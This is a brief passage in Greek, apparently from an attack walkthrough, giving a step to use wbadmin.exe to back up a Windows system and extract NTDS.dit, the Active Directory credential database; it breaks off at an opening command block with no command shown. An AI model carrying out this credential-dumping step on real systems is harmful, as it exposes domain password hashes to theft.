...
2. Χρησιμοποιήστε `wbadmin.exe` για την εφεδρική αντιγραφή του συστήματος και την εξαγωγή του `NTDS.dit`:
```cmd
